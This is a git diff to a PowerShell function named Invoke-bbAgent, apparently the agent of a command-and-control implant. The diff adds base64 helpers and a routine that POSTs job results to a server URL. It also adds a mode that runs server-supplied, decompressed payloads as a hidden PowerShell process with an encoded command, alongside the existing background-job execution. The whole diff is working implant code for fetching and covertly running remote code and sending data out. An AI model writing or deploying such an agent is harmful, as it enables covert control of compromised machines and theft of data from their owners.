@@ -56,10 +56,37 @@ function Invoke-bbAgent
         [CmdletBinding()]
         Param(
             [Parameter(Mandatory=$true)]
-            [string]$payload
+            [string]$payload,
+            [string]$Encoding="utf8"
         )
         Write-Verbose "Converting string from base64."
-        return [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($payload)))
+        if($Encoding -eq "utf8")
+        {
+            return [System.Text.Encoding]::UTF8.GetString(([System.Convert]::FromBase64String($payload)))
+        }
+        else
+        {
+            return [System.Text.Encoding]::Unicode.GetString(([System.Convert]::FromBase64String($payload)))
+        }
+    }
+
+    function ConvertTo-Base64
+    {
+        [CmdletBinding()]
+        Param(
+            [Parameter(Mandatory=$true)]
+            [string]$Payload,
+            [string]$Encoding="utf8"
+        )
+        Write-Verbose "Converting string to base64"
+        if($Encoding -eq "utf8")
+        {
+            return [System.Convert]::toBase64String(([System.Text.Encoding]::UTF8.GetBytes($Payload)))            
+        }
+        else
+        {
+            return [System.Convert]::toBase64String(([System.Text.Encoding]::Unicode.GetBytes($Payload)))            
+        }
     }
 
     #Uncompress encoded compressed script
@@ -74,6 +101,30 @@ function Invoke-bbAgent
         $decodedCompressedBytes = [IO.MemoryStream][Convert]::FromBase64String($CompressedScript)
         $uncompressedBytes = New-Object IO.Compression.DeflateStream($decodedCompressedBytes,[IO.Compression.CompressionMode]::Decompress)
         return (New-Object IO.StreamReader($uncompressedBytes,[Text.Encoding]::ASCII)).ReadToEnd()
+    }
+
+    function Send-ReturnData
+    {
+        [CmdletBinding()]
+        Param(
+            [Parameter(Mandatory=$true)]
+            [psobject]$ReturnData
+        )
+        Write-Host $ReturnData
+        $jsonJob = ConvertTo-Json20 -item $ReturnData
+        Write-Verbose ("Data being sent is: {0}" -f $jsonJob)
+        Write-Verbose ("Url being sent to: {0}" -f $dataURL)
+        $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
+        Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
+        try
+        {
+            $null = $webc.UploadString($dataURL, "POST", $jsonJob)
+            return $true
+        }
+        catch
+        {
+            return $false
+        }
     }
 
     #JobCycle
@@ -109,14 +160,17 @@ function Invoke-bbAgent
                                 jobName = $_.Name
                                 data = $jobData
                             }
-                            $jobJSON = ConvertTo-Json20 -item $returnobj
+
                             Write-Verbose ("Removing Job:{0} and sending data." -f $_.Name)
                             $null = remove-job $_
-                            Write-Verbose ("Data being sent is: {0}" -f $jobJSON)
-                            Write-Verbose ("Url being sent to: {0}" -f $dataURL)
-                            $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
-                            Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
-                            $webc.UploadString($dataURL, "POST", $jobJSON)
+                            if(Send-ReturnData -ReturnData $returnobj)
+                            {
+                                Write-Verbose "Data successfully returned."
+                            }
+                            else
+                            {
+                                Write-Verbose "Failed to return Data."
+                            }                            
                         }
                     }
                     $doneJobs | where {@("Blocked","Failed") -contains $_.State} | foreach {
@@ -134,14 +188,17 @@ function Invoke-bbAgent
                             jobName = $_.Name
                             data = $jobData
                         }
-                        $jobJSON = ConvertTo-Json20 -item $returnobj                       
+
                         Write-Verbose ("Removing and sending Job: {0}" -f $_.Name)
                         $null = Stop-Job $_ -PassThru | Remove-Job
-                        Write-Verbose ("Data being sent is: {0}" -f $jobJSON)
-                        Write-Verbose ("Url being sent to: {0}" -f $dataURL)
-                        $webc.Headers[[System.Net.HttpRequestHeader]::ContentType] = "application/json"
-                        Write-Verbose ("Content Type is: {0}" -f $webc.Headers[[System.Net.HttpRequestHeader]::ContentType])
-                        $webc.UploadString($dataURL, "POST", (ConvertTo-Json20 -item $returnobj))
+                        if(Send-ReturnData -ReturnData $returnobj)
+                        {
+                            Write-Verbose "Data successfully returned."
+                        }
+                        else
+                        {
+                            Write-Verbose "Data unsuccessfully returned."
+                        }
                     }
                 }
                 Write-Verbose "Getting jobs from server."
@@ -154,10 +211,9 @@ function Invoke-bbAgent
                     $payloadobj = $null
                 }
                 
-                if($payloadobj -and $payloadobj.jobName -ne "none")
+                if($payloadobj -and $payloadobj.payload -ne "none")
                 {
-                    $emptycount = 0
-                    Write-Verbose ("Payload encoding is: {0}" -f $payloadobj.encoding)
+                    $emptycount = 0                    
                     if($payloadobj.payload)
                     {                        
                         $payloadobj.payload = ConvertFrom-CompressedEncoded -CompressedScript $($payloadobj.payload)
@@ -165,10 +221,21 @@ function Invoke-bbAgent
                     
                     Write-Verbose "Appending command to script."
                     $payloadobj.payload += $payloadobj.command
-                    Write-Verbose "Creating scriptblock from payload."
-                    $payload = [scriptblock]::Create(($payloadobj.payload))
-                    Write-Verbose "Starting job from payload."
-                    $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload
+                    Write-Verbose ("Checking for runType which is: {0}" -f $payloadobj.runType)
+                    if($payloadobj.runType -eq "process")
+                    {
+                        Write-Verbose "Running job as process."
+                        $paydirt = ConvertTo-Base64 -Payload $payloadobj.payload -Encoding "unicode"
+                        $null = Start-Process "Powershell" -WindowStyle "Hidden" -ArgumentList "-NonI -NoP -W Hidden -ENC $paydirt"
+                    }
+                    else
+                    {
+                        Write-Verbose "Creating scriptblock from payload."
+                        $payload = [scriptblock]::Create(($payloadobj.payload))
+                        Write-Verbose "Starting job from payload."
+                        $null = Start-Job -Name $($payloadobj.jobName) -ScriptBlock $payload
+                    }
+                    
                 }
                 elseif((Get-Job))
                 {
